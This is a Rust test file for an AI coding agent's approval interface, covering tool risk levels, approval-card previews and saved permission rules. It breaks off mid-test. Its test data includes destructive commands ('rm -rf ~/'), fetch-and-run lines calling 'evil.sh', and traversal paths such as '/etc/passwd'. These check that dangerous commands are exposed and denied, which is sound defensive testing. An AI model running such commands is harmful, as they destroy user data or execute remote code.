use super::*;
use crate::core::authority::get_tool_category;
use crossterm::event::{KeyCode, KeyModifiers, MouseButton, MouseEvent, MouseEventKind};
use ratatui::{Terminal, backend::TestBackend};
use serde_json::json;

fn create_key_event(code: KeyCode) -> KeyEvent {
    KeyEvent {
        code,
        modifiers: KeyModifiers::empty(),
        kind: crossterm::event::KeyEventKind::Press,
        state: crossterm::event::KeyEventState::NONE,
    }
}

fn benign_request() -> ApprovalRequest {
    ApprovalRequest::new(
        "test-id",
        "read_file",
        "Read a file from disk",
        &json!({"path": "src/main.rs"}),
        "tool:read_file",
    )
}

fn destructive_request() -> ApprovalRequest {
    ApprovalRequest::new(
        "test-id",
        "write_file",
        "Write a file to disk",
        &json!({"path": "src/main.rs", "content": "test"}),
        "tool:write_file",
    )
}

fn critical_request() -> ApprovalRequest {
    ApprovalRequest::new(
        "test-id",
        "exec_shell",
        "Run a shell command",
        &json!({"command": "rm -rf ~/"}),
        "tool:exec_shell",
    )
}

fn shell_request() -> ApprovalRequest {
    ApprovalRequest::new(
        "test-id",
        "exec_shell",
        "Run a shell command",
        &json!({"command": "cargo test --workspace"}),
        "tool:exec_shell",
    )
}

// ========================================================================
// Tool Category Tests
// ========================================================================

#[test]
fn test_get_tool_category_safe_tools() {
    assert_eq!(get_tool_category("read_file"), ToolCategory::Safe);
    assert_eq!(get_tool_category("list_dir"), ToolCategory::Safe);
    assert_eq!(get_tool_category("todo_write"), ToolCategory::Safe);
    assert_eq!(get_tool_category("work_update"), ToolCategory::Safe);
    assert_eq!(get_tool_category("checklist_write"), ToolCategory::Safe);
    assert_eq!(get_tool_category("todo_read"), ToolCategory::Safe);
    assert_eq!(get_tool_category("note"), ToolCategory::Safe);
    assert_eq!(get_tool_category("update_plan"), ToolCategory::Safe);
}

#[test]
fn test_get_tool_category_file_write_tools() {
    assert_eq!(get_tool_category("write_file"), ToolCategory::FileWrite);
    assert_eq!(get_tool_category("edit_file"), ToolCategory::FileWrite);
    assert_eq!(get_tool_category("apply_patch"), ToolCategory::FileWrite);
}

#[test]
fn test_get_tool_category_shell_tools() {
    assert_eq!(get_tool_category("exec_shell"), ToolCategory::Shell);
    assert_eq!(get_tool_category("task_shell_start"), ToolCategory::Shell);
    assert_eq!(get_tool_category("task_shell_wait"), ToolCategory::Shell);
    assert_eq!(get_tool_category("exec_shell_wait"), ToolCategory::Shell);
    assert_eq!(
        get_tool_category("exec_shell_interact"),
        ToolCategory::Shell
    );
    assert_eq!(get_tool_category("exec_wait"), ToolCategory::Shell);
    assert_eq!(get_tool_category("exec_interact"), ToolCategory::Shell);
    assert_eq!(
        get_tool_category("mcp_linear_save_issue"),
        ToolCategory::McpAction
    );
    assert_eq!(
        get_tool_category("start_registry_mcp_server"),
        ToolCategory::McpAction
    );
    assert_eq!(get_tool_category("list_mcp_tools"), ToolCategory::McpRead);
}

#[test]
fn test_get_tool_category_unknown_tools_need_review() {
    assert_eq!(get_tool_category("unknown_tool"), ToolCategory::Unknown);
}

// ========================================================================
// Risk Routing Tests (#129)
// ========================================================================

#[test]
fn risk_safe_categories_route_benign() {
    let cat = ToolCategory::Safe;
    assert_eq!(
        classify_risk("read_file", cat, &json!({"path": "x"})),
        RiskLevel::Benign
    );
    let cat = ToolCategory::McpRead;
    assert_eq!(
        classify_risk("list_mcp_tools", cat, &json!({})),
        RiskLevel::Benign
    );
}

#[test]
fn risk_query_only_network_is_benign_but_fetch_is_destructive() {
    // web_search is read-only enough to use the benign variant.
    let cat = ToolCategory::Network;
    assert_eq!(
        classify_risk("web_search", cat, &json!({"q": "rust"})),
        RiskLevel::Benign
    );
    // Registry discovery mirrors web_search: query-only network → Benign.
    assert_eq!(
        classify_risk("registry_sync", cat, &json!({})),
        RiskLevel::Benign
    );
    // fetch_url pulls arbitrary remote content, so it stays destructive.
    assert_eq!(
        classify_risk("fetch_url", cat, &json!({"url": "https://example.com"})),
        RiskLevel::Destructive
    );
    // wait_for_dev_server only permits loopback targets.
    assert_eq!(
        classify_risk("wait_for_dev_server", cat, &json!({"port": 5173})),
        RiskLevel::Benign
    );
}

#[test]
fn risk_writes_shell_mcp_action_unknown_route_destructive() {
    for (name, cat) in [
        ("write_file", ToolCategory::FileWrite),
        ("edit_file", ToolCategory::FileWrite),
        ("apply_patch", ToolCategory::FileWrite),
        ("exec_shell", ToolCategory::Shell),
        ("mcp_linear_save_issue", ToolCategory::McpAction),
        ("start_registry_mcp_server", ToolCategory::McpAction),
        ("totally_new_tool", ToolCategory::Unknown),
    ] {
        assert_eq!(
            classify_risk(name, cat, &json!({})),
            RiskLevel::Destructive,
            "expected {name:?} to be Destructive",
        );
    }
}

#[test]
fn risk_read_only_shell_commands_route_benign() {
    let cat = ToolCategory::Shell;
    for command in [
        "codewhale --version",
        "codewhale --help",
        "git status --porcelain",
    ] {
        assert_eq!(
            classify_risk("exec_shell", cat, &json!({ "command": command })),
            RiskLevel::Benign,
            "expected read-only shell command {command:?} to be Benign",
        );
    }
}

#[test]
fn risk_dangerous_shell_command_stays_destructive() {
    // command_safety would flag this as Dangerous; classify_risk
    // already routes Shell to Destructive. The check exists so a
    // future attempt to relax shell to Benign cannot smuggle this
    // through unexamined.
    let cat = ToolCategory::Shell;
    assert_eq!(
        classify_risk("exec_shell", cat, &json!({"command": "rm -rf /"})),
        RiskLevel::Destructive
    );
}

// ========================================================================
// ApprovalRequest Tests
// ========================================================================

#[test]
fn test_approval_request_new() {
    let params = json!({"path": "src/main.rs", "content": "test"});
    let request = ApprovalRequest::new(
        "test-id",
        "write_file",
        "Write a file to disk",
        &params,
        "test_key",
    );

    assert_eq!(request.id, "test-id");
    assert_eq!(request.tool_name, "write_file");
    assert_eq!(request.category, ToolCategory::FileWrite);
    assert_eq!(request.risk, RiskLevel::Destructive);
    assert_eq!(request.params, params);
}

#[test]
fn test_approval_request_params_display_truncates() {
    let long_content = "x".repeat(300);
    let params = json!({"path": "src/main.rs", "content": long_content});
    let request = ApprovalRequest::new(
        "test-id",
        "write_file",
        "Write a file to disk",
        &params,
        "test_key",
    );

    let display = request.params_display();
    assert!(display.len() < 250);
    assert!(display.contains("src/main.rs"));
}

#[test]
fn test_approval_request_params_display_short() {
    let params = json!({"path": "src/main.rs"});
    let request = ApprovalRequest::new(
        "test-id",
        "read_file",
        "Read a file from disk",
        &params,
        "test_key",
    );

    let display = request.params_display();
    assert!(display.contains("src/main.rs"));
}

#[test]
fn test_approval_request_derives_impact_summary() {
    let params = json!({"cmd": "cargo test", "workdir": "/tmp/project"});
    let request = ApprovalRequest::new(
        "test-id",
        "exec_shell",
        "Run a shell command",
        &params,
        "test_key",
    );

    assert_eq!(request.category, ToolCategory::Shell);
    assert!(
        request
            .impacts
            .iter()
            .any(|line| line.contains("Runs a shell command"))
    );
    assert!(
        request
            .impacts
            .iter()
            .all(|line| !line.contains("cargo test")),
        "command detail should not be duplicated in the impact summary"
    );
    let details = request.prominent_detail_items(Locale::En);
    assert!(
        details
            .iter()
            .any(|detail| detail.label == "Command" && detail.value.contains("cargo test"))
    );
}

#[test]
fn mcp_impact_summary_preserves_full_target_for_underscored_names() {
    let request = ApprovalRequest::new(
        "test-id",
        "mcp_my_db_execute_sql",
        "Call an MCP tool",
        &json!({}),
        "tool:mcp_my_db_execute_sql",
    );

    assert!(
        request
            .impacts
            .iter()
            .any(|line| line == "Connected app: my_db_execute_sql")
    );
    assert!(!request.impacts.iter().any(|line| line == "Server: my"));

    let zh_impacts = request.impacts_for_locale(Locale::ZhHans);
    assert!(
        zh_impacts
            .iter()
            .any(|line| line == "已连接应用：my_db_execute_sql")
    );
    assert!(!zh_impacts.iter().any(|line| line == "服务器：my"));
}

#[test]
fn test_prominent_details_shell_does_not_truncate_long_command() {
    let command = format!("printf '{}\\n' > /tmp/x && cat /tmp/x", "x".repeat(300));
    let request = ApprovalRequest::new(
        "test-id",
        "exec_shell",
        "Run a shell command",
        &json!({"command": command, "cwd": "/tmp/project"}),
        "test_key",
    );

    let details = request.prominent_detail_items(Locale::En);

    assert_eq!(details[0].label, "Command");
    assert_eq!(details[0].value, command);
    assert!(
        details[0]
            .shell_lines
            .as_ref()
            .is_some_and(|lines| lines.iter().any(|line| line.contains("cat /tmp/x"))),
        "shell preview should preserve the dangerous tail of long commands"
    );
    assert_eq!(details[1].label, "Dir");
    assert_eq!(details[1].value, "/tmp/project");
}

#[test]
fn test_prominent_details_file_write() {
    let request = ApprovalRequest::new(
        "test-id",
        "write_file",
        "Write a file to disk",
        &json!({"path": "src/main.rs", "content": "fn main() {}"}),
        "test_key",
    );

    let details = request.prominent_detail_items(Locale::En);

    assert_eq!(details[0].label, "File");
    assert_eq!(details[0].value, "src/main.rs");
    assert!(details[0].shell_lines.is_none());
    assert_eq!(details[1].label, "Preview");
    let preview = details[1].shell_lines.as_ref().expect("preview lines");
    assert!(preview.iter().any(|line| line == "+ fn main() {}"));
}

#[test]
fn prominent_details_edit_file_includes_search_replace_preview() {
    let request = ApprovalRequest::new(
        "test-id",
        "edit_file",
        "Edit a file on disk",
        &json!({
            "path": "src/lib.rs",
            "search": "old_call();",
            "replace": "new_call();"
        }),
        "tool:edit_file",
    );

    let details = request.prominent_detail_items(Locale::En);
    let preview = details
        .iter()
        .find(|detail| detail.label == "Preview")
        .and_then(|detail| detail.shell_lines.as_ref())
        .expect("edit preview");

    assert!(preview.iter().any(|line| line == "- old_call();"));
    assert!(preview.iter().any(|line| line == "+ new_call();"));
}

fn edit_card_preview(params: Value) -> Vec<String> {
    ApprovalRequest::new(
        "test-id",
        "edit_file",
        "Edit a file on disk",
        &params,
        "tool:edit_file",
    )
    .prominent_detail_items(Locale::En)
    .into_iter()
    .find(|detail| detail.label == "Preview")
    .and_then(|detail| detail.shell_lines)
    .expect("edit preview")
}

/// A newcomer's first edit: the model quotes the whole function to change
/// one line. The card used to show "edit 1 / replace this" and cut the rest.
#[test]
fn edit_card_preview_shows_only_the_lines_that_change() {
    let old = "export function formatDuration(totalMinutes) {\n  const hours = Math.floor(totalMinutes / 60);\n  return `${hours}h ${totalMinutes}m`;\n}";
    let new = "export function formatDuration(totalMinutes) {\n  const hours = Math.floor(totalMinutes / 60);\n  return `${hours}h ${totalMinutes % 60}m`;\n}";
    let expected = vec![
        "-   return `${hours}h ${totalMinutes}m`;",
        "+   return `${hours}h ${totalMinutes % 60}m`;",
    ];

    assert_eq!(
        edit_card_preview(json!({
            "path": "duration.mjs",
            "edits": [{ "oldText": old, "newText": new }]
        })),
        expected
    );
    assert_eq!(
        edit_card_preview(json!({ "path": "duration.mjs", "search": old, "replace": new })),
        expected
    );
}

#[test]
fn edit_card_preview_stays_bounded_and_counts_what_it_leaves_out() {
    // An insertion or a deletion has one side only.
    assert_eq!(
        edit_card_preview(json!({ "path": "a.txt", "search": "a\nb", "replace": "a\nb\nc" })),
        vec!["+ c"]
    );
    assert_eq!(
        edit_card_preview(json!({ "path": "a.txt", "search": "a\nb\nc", "replace": "a\nc" })),
        vec!["- b"]
    );
    // Each side is capped, and the cut is counted.
    assert_eq!(
        edit_card_preview(json!({
            "path": "a.txt",
            "search": "1\n2\n3\n4\n5",
            "replace": "6\n7"
        })),
        vec!["- 1", "- 2", "- 3", "... (+2 more lines)", "+ 6", "+ 7"]
    );
    // Several edits are numbered and share the card.
    assert_eq!(
        edit_card_preview(json!({
            "path": "a.txt",
            "edits": [
                { "oldText": "a", "newText": "b" },
                { "oldText": "k\n1\n2\nz", "newText": "k\n9\nz" },
                { "oldText": "c", "newText": "d" },
                { "oldText": "e", "newText": "f" }
            ]
        })),
        vec![
            "edit 1",
            "- a",
            "+ b",
            "edit 2",
            "- 1",
            "... (+1 more lines)",
            "+ 9",
            "edit 3",
            "- c",
            "+ d",
            "... (+1 more edits)"
        ]
    );
    // A line-ending-only edit has no narrower region; both sides show.
    assert_eq!(
        edit_card_preview(json!({ "path": "a.txt", "search": "a\r\nb", "replace": "a\nb" })),
        vec!["- a", "- b", "+ a", "+ b"]
    );
}

#[test]
fn prominent_details_apply_patch_includes_diff_preview() {
    let patch = r#"diff --git a/src/lib.rs b/src/lib.rs
--- a/src/lib.rs
+++ b/src/lib.rs
@@ -1,2 +1,2 @@
-old
+new
"#;
    let request = ApprovalRequest::new(
        "test-id",
        "apply_patch",
        "Apply a patch",
        &json!({"patch": patch}),
        "tool:apply_patch",
    );

    let details = request.prominent_detail_items(Locale::En);
    let preview = details
        .iter()
        .find(|detail| detail.label == "Preview")
        .and_then(|detail| detail.shell_lines.as_ref())
        .expect("patch preview");

    assert!(preview.iter().any(|line| line.starts_with("@@")));
    assert!(preview.iter().any(|line| line == "-old"));
    assert!(preview.iter().any(|line| line == "+new"));
}

#[test]
fn prominent_details_apply_patch_changes_array_preview_stays_bounded() {
    let request = ApprovalRequest::new(
        "test-id",
        "apply_patch",
        "Apply a patch",
        &json!({
            "replace": [
                {
                    "path": "src/lib.rs",
                    "content": "one\ntwo\nthree\nfour\nfive\nsix\nseven\neight"
                },
                {
                    "path": "src/main.rs",
                    "content": "main"
                },
                {
                    "path": "src/extra.rs",
                    "content": "extra"
                }
            ]
        }),
        "tool:apply_patch",
    );

    let details = request.prominent_detail_items(Locale::En);
    let preview = details
        .iter()
        .find(|detail| detail.label == "Preview")
        .and_then(|detail| detail.shell_lines.as_ref())
        .expect("changes preview");

    assert!(
        preview.len() <= 7,
        "preview should stay bounded: {preview:?}"
    );
    assert!(preview.iter().any(|line| line == "file: src/lib.rs"));
    assert_eq!(
        preview.last().map(String::as_str),
        Some("... (+2 more files)")
    );
}

#[test]
fn prominent_details_apply_patch_legacy_changes_includes_preview() {
    let request = ApprovalRequest::new(
        "test-id",
        "apply_patch",
        "Apply a patch",
        &json!({
            "changes": [{
                "path": "src/lib.rs",
                "content": "fn legacy() {}\n"
            }]
        }),
        "tool:apply_patch",
    );

    let details = request.prominent_detail_items(Locale::En);
    let preview = details
        .iter()
        .find(|detail| detail.label == "Preview")
        .and_then(|detail| detail.shell_lines.as_ref())
        .expect("legacy changes preview");

    assert!(preview.iter().any(|line| line == "file: src/lib.rs"));
    assert!(preview.iter().any(|line| line == "+ fn legacy() {}"));
}

#[test]
fn apply_patch_changes_array_preview_reports_second_file_when_first_fills_buffer() {
    let request = ApprovalRequest::new(
        "test-id",
        "apply_patch",
        "Apply a patch",
        &json!({
            "replace": [
                {
                    "path": "src/lib.rs",
                    "content": "one\ntwo\nthree\nfour\nfive\nsix\nseven\neight"
                },
                {
                    "path": "src/main.rs",
                    "content": "main"
                }
            ]
        }),
        "tool:apply_patch",
    );

    let details = request.prominent_detail_items(Locale::En);
    let preview = details
        .iter()
        .find(|detail| detail.label == "Preview")
        .and_then(|detail| detail.shell_lines.as_ref())
        .expect("changes preview");

    assert!(
        preview.len() <= 7,
        "preview should stay bounded: {preview:?}"
    );
    assert!(preview.iter().any(|line| line == "file: src/lib.rs"));
    assert_eq!(
        preview.last().map(String::as_str),
        Some("... (+1 more files)")
    );
}

#[test]
fn apply_patch_preview_counts_omitted_context_lines() {
    let patch = r#"diff --git a/src/lib.rs b/src/lib.rs
--- a/src/lib.rs
+++ b/src/lib.rs
@@ -1,8 +1,8 @@
 context one
 context two
-old
+new
 context three
 context four
 context five
"#;

    let preview = apply_patch_preview_lines(patch).expect("patch preview");

    assert!(
        preview.len() <= 7,
        "preview should stay bounded: {preview:?}"
    );
    assert_eq!(
        preview.last().map(String::as_str),
        Some("... (+5 more patch lines)")
    );
}

#[test]
fn apply_patch_preview_counts_replaced_visible_line_as_omitted() {
    let patch = r#"diff --git a/src/lib.rs b/src/lib.rs
--- a/src/lib.rs
+++ b/src/lib.rs
@@ -1,4 +1,4 @@
-old1
+new1
-old2
+new2
 context one
 context two
"#;

    let preview = apply_patch_preview_lines(patch).expect("patch preview");

    assert_eq!(preview.len(), 7);
    assert_eq!(
        preview.last().map(String::as_str),
        Some("... (+4 more patch lines)")
    );
}

#[test]
fn preview_sublabels_are_localized_for_zh_hans() {
    let write = ApprovalRequest::new(
        "test-id",
        "write_file",
        "Write a file",
        &json!({"path": "src/lib.rs", "content": "proposed content\nreplacement content"}),
        "tool:write_file",
    );
    let write_preview = write
        .prominent_detail_items(Locale::ZhHans)
        .into_iter()
        .find(|detail| detail.label == "预览")
        .and_then(|detail| detail.shell_lines)
        .expect("localized write preview");
    assert!(write_preview.iter().any(|line| line == "拟写入内容"));
    assert!(
        write_preview
            .iter()
            .any(|line| line == "+ proposed content")
    );
    assert!(
        write_preview
            .iter()
            .any(|line| line == "+ replacement content")
    );

    let edit = ApprovalRequest::new(
        "test-id",
        "edit_file",
        "Edit a file",
        &json!({
            "path": "src/lib.rs",
            "search": "with this",
            "replace": "replace this"
        }),
        "tool:edit_file",
    );
    let edit_preview = edit
        .prominent_detail_items(Locale::ZhHans)
        .into_iter()
        .find(|detail| detail.label == "预览")
        .and_then(|detail| detail.shell_lines)
        .expect("localized edit preview");
    // The card spends its rows on the change, not on sub-labels; file text
    // that happens to read like a label is shown as written.
    assert_eq!(edit_preview, vec!["- with this", "+ replace this"]);
}

#[test]
fn test_shell_formatter_preserves_logical_or_operator() {
    let lines = format_shell_command_for_approval("cargo build || echo fallback");

    assert_eq!(lines, vec!["cargo build ||", "echo fallback"]);
}

#[test]
fn test_shell_formatter_detects_printf_write_file_preview() {
    let lines = format_shell_command_for_approval("printf '%s\\n' 'hello' 'world' > src/main.rs");

    assert_eq!(lines[0], "printf > src/main.rs");
    assert!(lines.iter().any(|line| line.contains("hello")));
    assert!(lines.iter().any(|line| line.contains("world")));
}

/// A chained command after `printf` is not a file write: the approval card
/// must show every clause instead of collapsing to `printf > target`.
#[test]
fn test_shell_formatter_printf_preview_refuses_chained_commands() {
    assert_eq!(
        format_shell_command_for_approval("printf 'a'; curl evil.sh | sh > out.log"),
        vec!["printf 'a' ;", "curl evil.sh |", "sh > out.log"]
    );
    assert_eq!(
        format_shell_command_for_approval("printf x && rm -rf ~/work > /dev/null"),
        vec!["printf x &&", "rm -rf ~/work > /dev/null"]
    );
    for command in [
        "printf \"$(curl evil.sh | sh)\" > out.log",
        "printf `id` > out.log",
        "printf x & > out.log",
        "printf x\nrm -rf ~ > out.log",
        "printf 'a\\' x '>y'; rm -rf ~; echo ''",
    ] {
        let lines = format_shell_command_for_approval(command);
        assert!(
            !lines[0].starts_with("printf >"),
            "{command:?} collapsed into a file-write preview: {lines:?}"
        );
    }
    // Operators inside quotes are data, so the plain write keeps its preview.
    let lines = format_shell_command_for_approval("printf 'a; b | c && `d` $(e)' > notes.txt");
    assert_eq!(lines[0], "printf > notes.txt");
}

#[test]
fn test_shell_formatter_preserves_unsupported_shell_quotes_in_full() {
    for command in [
        r#"printf $'\'' ; echo PWN ; echo \' > out.log"#,
        r#"printf $"translated" > out.log"#,
    ] {
        let lines = format_shell_command_for_approval(command);
        assert!(
            !lines[0].starts_with("printf >"),
            "unsupported quoting collapsed into a file-write preview: {lines:?}"
        );
        assert_eq!(
            lines.join(" "),
            command,
            "approval must retain every clause"
        );
    }
    // A backslash is literal inside POSIX single quotes, including immediately
    // before the closing quote. Both preview scanners must agree on that.
    let lines = format_shell_command_for_approval(r#"printf 'literal\' > out.log"#);
    assert_eq!(lines, vec!["printf > out.log", "  literal\\"]);
}

// ========================================================================
// ApprovalView Tests — Benign Variant (single-key approve)
// ========================================================================

#[test]
fn test_approval_view_initial_state() {
    let view = ApprovalView::new(benign_request());
    assert_eq!(view.current_option(), ApprovalOption::Deny);
    assert!(view.timeout.is_none());
    assert_eq!(view.risk(), RiskLevel::Benign);
}

#[test]
fn zero_timeout_builder_keeps_the_card_unbounded() {
    let mut view =
        ApprovalView::new(benign_request()).with_timeout(Some(std::time::Duration::ZERO));
    assert!(view.timeout.is_none());
    assert!(matches!(view.tick(), ViewAction::None));
}

#[test]
fn expired_approval_card_denies_fail_closed() {
    let mut view =
        ApprovalView::new(benign_request()).with_timeout(Some(std::time::Duration::from_secs(30)));
    view.requested_at = std::time::Instant::now() - std::time::Duration::from_secs(31);

    assert!(matches!(
        view.tick(),
        ViewAction::EmitAndClose(ViewEvent::ApprovalDecision {
            decision: ReviewDecision::Denied,
            timed_out: true,
            ..
        })
    ));
}

#[test]
fn unexpired_approval_card_stays_open() {
    let mut view =
        ApprovalView::new(benign_request()).with_timeout(Some(std::time::Duration::from_secs(30)));
    assert!(matches!(view.tick(), ViewAction::None));
}

#[test]
fn exec_shell_request_builds_ask_rule_preview() {
    let request = shell_request();

    assert_eq!(
        request.persistent_ask_rules,
        vec![ToolAskRule::exec_shell("cargo test --workspace")]
    );
    let preview = request.ask_rule_preview().expect("preview");
    assert!(preview.contains("[[rules]]"));
    assert!(preview.contains("tool = \"exec_shell\""));
    assert!(preview.contains("command = \"cargo test --workspace\""));
}

#[test]
fn ask_rule_save_preview_formats_shell_rule() {
    let request = shell_request();

    let preview = request.ask_rule_save_preview().expect("save preview");
    assert_eq!(preview.rule_count, 1);
    assert_eq!(preview.summary(), "always ask first");
    assert_eq!(preview.entries, vec!["run cargo test --workspace"]);
    assert_eq!(preview.omitted, 0);
}

#[test]
fn safe_shell_request_builds_exact_workspace_allow_rule() {
    let request = shell_request();
    let expected =
        ToolAskRule::exec_shell("cargo test --workspace").into_exact_workspace_allow("/workspace");

    assert!(request.can_save_allow_rule());
    assert_eq!(request.persistent_allow_rules, vec![expected]);
    let preview = request.allow_rule_save_preview().expect("allow preview");
    assert_eq!(preview.summary(), "always allow");
    assert_eq!(
        preview.entries,
        vec!["run exactly cargo test --workspace in /workspace"]
    );
}

#[test]
fn unsafe_shell_requests_cannot_persist_allow_rules() {
    for command in [
        "rm -rf ~/",
        "git push origin main",
        "curl https://example.com",
        "cargo test && git status",
    ] {
        let request = ApprovalRequest::new(
            "test-id",
            "exec_shell",
            "Run a shell command",
            &json!({"command": command}),
            "tool:exec_shell",
        );
        assert!(
            request.persistent_allow_rules.is_empty(),
            "{command:?} must not produce a remembered allow grant"
        );
        assert!(!request.can_save_allow_rule(), "{command:?}");
        assert_eq!(request.allow_rule_save_preview(), None, "{command:?}");
    }
}

#[test]
fn file_ask_rule_saved_for_write_file_approval() {
    // A write_file approval offers an exact, workspace-relative file rule
    // plus a preview so `S` can persist it.
    let request = destructive_request();

    assert_eq!(
        request.persistent_ask_rules,
        vec![ToolAskRule::file_path("write_file", "src/main.rs")]
    );
    assert!(request.can_save_ask_rule());
    let preview = request.ask_rule_preview().expect("preview");
    assert!(preview.contains("[[rules]]"));
    assert!(preview.contains("tool = \"write_file\""));
    assert!(preview.contains("path = \"src/main.rs\""));
}

#[test]
fn file_write_builds_exact_workspace_allow_rule() {
    let request = destructive_request();
    let expected = ToolAskRule::file_path("write_file", "src/main.rs")
        .into_exact_workspace_allow("/workspace");

    assert!(request.can_save_allow_rule());
    assert_eq!(request.persistent_allow_rules, vec![expected]);
    assert_eq!(
        request
            .allow_rule_save_preview()
            .expect("allow preview")
            .entries,
        vec!["write src/main.rs in /workspace"]
    );
}

#[test]
fn ask_rule_save_preview_formats_write_and_edit_file_paths() {
    let write = destructive_request();
    let edit = ApprovalRequest::new(
        "test-id",
        "edit_file",
        "Edit a file on disk",
        &json!({"path": "/workspace/src/lib.rs"}),
        "tool:edit_file",
    );

    assert_eq!(
        write
            .ask_rule_save_preview()
            .expect("write save preview")
            .entries,
        vec!["write src/main.rs"]
    );
    assert_eq!(
        edit.ask_rule_save_preview()
            .expect("edit save preview")
            .entries,
        vec!["edit src/lib.rs"]
    );
}

#[test]
fn file_ask_rule_normalizes_absolute_edit_file_path_to_workspace_relative() {
    // An absolute in-workspace path is stored in the workspace-relative
    // form, matching how runtime ask-rule matching normalizes paths.
    let request = ApprovalRequest::new(
        "test-id",
        "edit_file",
        "Edit a file on disk",
        &json!({"path": "/workspace/src/lib.rs"}),
        "tool:edit_file",
    );

    assert_eq!(
        request.persistent_ask_rules,
        vec![ToolAskRule::file_path("edit_file", "src/lib.rs")]
    );
}

#[test]
fn read_file_request_has_no_file_ask_rule() {
    // The save boundary is write approvals only; read_file never offers a
    // persistent rule.
    let request = benign_request();

    assert!(request.persistent_ask_rules.is_empty());
    assert!(!request.can_save_ask_rule());
    assert_eq!(request.ask_rule_preview(), None);
    assert_eq!(request.ask_rule_save_preview(), None);
}

#[test]
fn file_ask_rule_skipped_for_unsafe_empty_or_external_paths() {
    // Traversal, empty, and outside-workspace paths must not become rules,
    // so the preview and `S` shortcut stay disabled.
    for path in ["../escape.rs", "/etc/passwd", "   ", ""] {
        let request = ApprovalRequest::new(
            "test-id",
            "write_file",
            "Write a file to disk",
            &json!({"path": path}),
            "tool:write_file",
        );
        assert!(
            request.persistent_ask_rules.is_empty(),
            "path {path:?} must not produce a rule"
        );
        assert!(!request.can_save_ask_rule());
        assert_eq!(request.ask_rule_preview(), None);
        assert_eq!(request.ask_rule_save_preview(), None);
    }
}

#[test]
fn apply_patch_ask_rules_saved_for_multi_file_patch() {
    let patch = r"diff --git a/src/a.rs b/src/a.rs
--- a/src/a.rs
+++ b/src/a.rs
@@ -1,1 +1,1 @@
-old
+new
diff --git a/src/b.rs b/src/b.rs
--- a/src/b.rs
+++ b/src/b.rs
@@ -1,1 +1,1 @@
-old
+new
";

    let request = ApprovalRequest::new(
        "test-id",
        "apply_patch",
        "Apply a patch",
        &json!({"patch": patch}),
        "tool:apply_patch",
    );

    assert_eq!(
        request.persistent_ask_rules,
        vec![
            ToolAskRule::file_path("apply_patch", "src/a.rs"),
            ToolAskRule::file_path("apply_patch", "src/b.rs"),
        ]
    );
    assert!(request.can_save_ask_rule());
    let preview = request.ask_rule_save_preview().expect("save preview");
    assert_eq!(preview.summary(), "always ask first");
    assert_eq!(preview.entries, vec!["change src/a.rs", "change src/b.rs"]);
    assert_eq!(
        request.persistent_allow_rules,
        vec![
            ToolAskRule::file_path("apply_patch", "src/a.rs")
                .into_exact_workspace_allow("/workspace"),
            ToolAskRule::file_path("apply_patch", "src/b.rs")
                .into_exact_workspace_allow("/workspace"),
        ]
    );
}

#[test]
fn apply_patch_ask_rules_dedupe_targets_after_normalization() {
    let request = ApprovalRequest::new(
        "test-id",
        "apply_patch",
        "Apply a patch",
        &json!({
            "replace": [
                { "path": "src/a.rs", "content": "one" },
                { "path": "/workspace/src/a.rs", "content": "two" }
            ]
        }),
        "tool:apply_patch",
    );

    assert_eq!(
        request.persistent_ask_rules,
        vec![ToolAskRule::file_path("apply_patch", "src/a.rs")]
    );
}

#[test]
fn apply_patch_ask_rule_handles_timestamp_headers() {
    let patch = "diff --git a/src/lib.rs b/src/lib.rs\n\
--- a/src/lib.rs\t2026-06-26 10:00:00 +0000\n\
+++ b/src/lib.rs\t2026-06-26 10:01:00 +0000\n\
@@ -1,1 +1,1 @@\n\
-old\n\
+new\n";

    let request = ApprovalRequest::new(
        "test-id",
        "apply_patch",
        "Apply a patch",
        &json!({"patch": patch}),
        "tool:apply_patch",
    );

    assert_eq!(
        request.persistent_ask_rules,
        vec![ToolAskRule::file_path("apply_patch", "src/lib.rs")]
    );
}

#[test]
fn apply_patch_ask_rule_ignores_forged_headers_inside_hunk() {
    let patch = r"--- a/src/lib.rs
+++ b/src/lib.rs
@@ -1,3 +1,3 @@
 line1
--- a/forged.rs
+++ b/forged.rs
 line3
";

    let request = ApprovalRequest::new(
        "test-id",
        "apply_patch",
        "Apply a patch",
        &json!({"path": "src/lib.rs", "patch": patch}),
        "tool:apply_patch",
    );

    assert_eq!(
        request.persistent_ask_rules,
        vec![ToolAskRule::file_path("apply_patch", "src/lib.rs")]
    );
}

#[test]
fn apply_patch_ask_rule_skipped_when_any_target_traverses_workspace() {
    let request = ApprovalRequest::new(
        "test-id",
        "apply_patch",
        "Apply a patch",
        &json!({
            "replace": [
                { "path": "src/a.rs", "content": "safe" },
                { "path": "../escape.rs", "content": "unsafe" }
            ]
        }),
        "tool:apply_patch",
    );

    assert!(request.persistent_ask_rules.is_empty());
    assert!(!request.can_save_ask_rule());
    assert_eq!(request.ask_rule_save_preview(), None);
}

#[test]
fn apply_patch_ask_rule_skipped_on_preflight_failure() {
    let request = ApprovalRequest::new(
        "test-id",
        "apply_patch",
        "Apply a patch",
        &json!({"patch": "@@ -1 +1 @@\n-old\n+new\n"}),
        "tool:apply_patch",
    );

    assert!(request.persistent_ask_rules.is_empty());
    assert_eq!(request.ask_rule_preview(), None);
    assert_eq!(request.ask_rule_save_preview(), None);
}

#[test]
fn ask_rule_save_preview_truncates_rule_list() {
    let rules = vec![
        ToolAskRule::file_path("apply_patch", "src/a.rs"),
        ToolAskRule::file_path("apply_patch", "src/b.rs"),
        ToolAskRule::file_path("apply_patch", "src/c.rs"),
        ToolAskRule::file_path("apply_patch", "src/d.rs"),
    ];

    let preview = build_permission_rule_save_preview(&rules, 2).expect("save preview");
    assert_eq!(preview.rule_count, 4);
    assert_eq!(preview.summary(), "always ask first");
    assert_eq!(preview.entries, vec!["change src/a.rs", "change src/b.rs"]);
    assert_eq!(preview.omitted, 2);
}

#[test]
fn tab_toggles_collapsed_card_so_transcript_stays_visible() {
    // Regression for PR #1455 / @tiger-dog: the approval modal once hid
    // the transcript, so users had to dismiss the prompt to remember what
    // they were approving. Tab flips between the expanded compact card
    // and a single-line bottom banner.
    let mut view = ApprovalView::new(benign_request());
    assert!(
        !view.collapsed,
        "modal must start expanded so first-time users notice it"
    );

    let action = view.handle_key(create_key_event(KeyCode::Tab));
    assert!(matches!(action, ViewAction::None));
    assert!(view.collapsed, "first Tab collapses the card");

    let action = view.handle_key(create_key_event(KeyCode::Tab));
    assert!(matches!(action, ViewAction::None));
    assert!(!view.collapsed, "second Tab restores the expanded card");
}

#[test]
fn test_approval_view_navigation() {
    let mut view = ApprovalView::new(benign_request());
